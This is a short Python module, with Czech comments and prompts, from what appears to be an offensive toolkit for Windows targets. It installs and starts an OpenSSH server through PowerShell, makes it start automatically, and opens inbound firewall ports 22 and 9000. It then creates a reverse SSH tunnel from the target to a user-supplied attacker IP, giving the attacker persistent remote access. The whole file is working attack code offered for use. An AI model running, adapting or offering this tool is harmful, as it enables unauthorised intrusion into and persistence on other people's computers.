# modules/ssh.py
"""
Reverse SSH tunnel: target -> attacker.
Vyžaduje OpenSSH server na targetu a listener na attackeru.
"""
import subprocess
from colorama import Fore


def run():
    if input("Pokracovat? y/n: ").strip().lower() != "y":
        print("Zruseno.")
        return

    if input("Skip OpenSSH install? y/n: ").strip().lower() != "y":
        _install_openssh()

    user = input("Attacker SSH user: ").strip()
    host = input("Attacker IP: ").strip()

    if input(f"{user}@{host} - OK? y/n: ").strip().lower() != "y":
        print("Zruseno.")
        return

    print(Fore.YELLOW + f"[*] Pripojuji na {host}...")
    print(Fore.YELLOW + "[*] Spust listener_attacker.sh na attackerovi")
    subprocess.run(["ssh", "-R", "9000:localhost:22", f"{user}@{host}"])


def _install_openssh():
    print(Fore.YELLOW + "[*] Instaluji OpenSSH...")
    for cmd in [
        "Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0",
        "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0",
        "Start-Service sshd",
        "Set-Service -Name sshd -StartupType Automatic",
        'New-NetFirewallRule -DisplayName "Allow SSH 22" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow',
        'New-NetFirewallRule -DisplayName "Allow SSH Tunnel 9000" -Direction Inbound -Protocol TCP -LocalPort 9000 -Action Allow',
    ]:
        subprocess.run(
            ["powershell", "-NoProfile", "-Command", cmd],
            capture_output=True,
        )